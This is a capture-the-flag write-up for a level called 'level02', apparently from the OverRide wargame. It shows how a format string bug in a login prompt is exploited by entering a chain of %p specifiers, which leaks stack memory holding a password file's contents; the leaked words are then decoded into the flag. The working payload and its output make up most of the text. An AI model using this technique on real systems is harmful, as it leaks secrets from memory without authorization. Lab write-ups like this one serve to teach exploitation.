# Write up

By disassembling the `level02` executable, we notice first that we now have an elf64 executable,
but we also notice that we will have a format string bug to exploit, this setup feels pretty familiar.
The `.pass` file contents is stored in a buffer higher in the stack, so we will move the va_arg pointer by chaining %x in the format.
By reading the stack using this payload :
```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
--[ Password:
*****************************************
0x7fffffffe4f0(nil)(nil)0x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6e80x1f7ff9a08(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025702570257025 does not have access!
```
We get some interesting results :
```
0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d
```
Which seems to be the 40 bytes file contents.
We put the bytes in little endian and convert them to ascii :
```
4868373452506E7551397361354A414558674E5743717A377358476E68354A354D394B6650673348
(using https://www.rapidtables.com/convert/number/hex-to-ascii.html)
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
Which gives us the flag.